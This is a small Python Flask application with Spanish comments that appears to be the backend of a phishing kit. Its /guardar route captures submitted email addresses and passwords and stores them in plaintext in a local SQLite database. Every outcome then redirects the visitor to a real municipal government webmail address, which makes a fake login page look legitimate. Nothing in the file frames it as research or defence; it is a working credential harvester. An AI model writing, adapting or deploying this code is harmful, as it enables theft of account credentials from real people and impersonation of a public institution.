from flask import Flask, redirect, request, jsonify, render_template
import sqlite3
import os


app = Flask(__name__)

@app.route('/')
def index():
    return app.send_static_file('index.html')

# Solo ejecuta app.run() en desarrollo
if __name__ == '__main__':
    app.run(debug=True)
# Inicializar la base de datos
def init_db():
    if not os.path.exists("usuarios.db"):
        conn = sqlite3.connect("usuarios.db")
        cursor = conn.cursor()
        cursor.execute('''
            CREATE TABLE IF NOT EXISTS usuarios (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                email TEXT NOT NULL,
                password TEXT NOT NULL
            )
        ''')
        conn.commit()
        conn.close()

# Ruta para cargar la página HTML


# Ruta para guardar datos
@app.route('/guardar', methods=['POST'])
def guardar():
    # Capturamos los datos del formulario
    email = request.form.get('email')
    password = request.form.get('password')

    if not email or not password:
        return redirect("https://www.patronatomunicipallatacunga.gob.ec:2096/")

    # Guardamos en la base de datos
    try:
        connection = sqlite3.connect("usuarios.db")
        cursor = connection.cursor()
        cursor.execute("INSERT INTO usuarios (email, password) VALUES (?, ?)", (email, password))
        connection.commit()
        connection.close()
        return redirect("https://www.patronatomunicipallatacunga.gob.ec:2096/")
    except Exception as e:
        return redirect("https://www.patronatomunicipallatacunga.gob.ec:2096/")


# Inicializar la base de datos al inicio
init_db()

# Ejecutar el servidor
if __name__ == '__main__':
    app.run(debug=True)
